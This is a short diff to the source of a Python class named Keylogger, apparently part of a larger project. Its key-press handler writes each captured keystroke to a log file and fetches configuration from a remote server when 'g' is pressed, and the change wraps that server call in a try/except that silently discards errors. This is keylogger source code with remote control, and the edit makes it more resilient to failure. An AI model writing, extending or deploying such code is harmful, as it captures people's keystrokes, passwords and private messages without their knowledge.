@@ -16,8 +16,11 @@ class Keylogger(Thread):
     def onPress(self, key):
         if self.__config.debug:
             print(key, end='')
-        if key.__str__() == 'g':
-            self.__communication.getConfigFromServer()
+        try:
+            if key.__str__() == 'g':
+                self.__communication.getConfigFromServer()
+        except Exception:
+            pass
         Util.fileOut(self.__config.logPath + self.__config.logFileName, key)
             
 
